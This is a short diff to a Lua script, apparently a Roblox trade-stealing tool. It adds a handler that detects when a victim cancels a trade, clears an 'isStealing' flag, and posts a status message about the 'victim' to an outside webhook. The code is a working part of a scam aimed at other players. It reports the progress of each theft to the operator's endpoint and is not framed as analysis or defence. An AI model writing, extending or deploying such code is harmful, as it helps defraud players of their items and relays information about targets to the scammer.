@@ -139,6 +139,24 @@ spawn(function()
     end
 end)
 
+local Box = Gui:WaitForChild("MessagePromptBox")
+Box:GetPropertyChangedSignal("Visible"):Connect(function()
+    if Box:WaitForChild("Box"):WaitForChild("TextBox").Text:lower():find("The trade was canceled") then
+        isStealing = false
+        local Body = game:GetService("HttpService"):JSONEncode({
+            content = "Victim presumably left because the trade was cancelled."
+        })
+        http.request({
+            Url = AJwebhook,
+            Method = "POST",
+            Headers = {
+                ["content-type"] = "application/json"
+            },
+            Body = Body
+        })
+    end
+end)
+
 ws.OnMessage:Connect(function(msg)
     local json = HttpService:JSONDecode(msg)
     if not json then return warn("not json") end
